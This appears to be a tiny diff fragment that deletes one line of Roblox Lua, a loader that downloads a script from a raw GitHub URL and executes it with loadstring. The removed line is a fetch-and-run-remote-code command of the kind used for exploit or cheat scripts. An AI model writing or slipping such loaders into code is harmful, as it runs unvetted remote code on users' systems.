@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/antipipka/roblox/main/77_4ZDJF.lua"))()
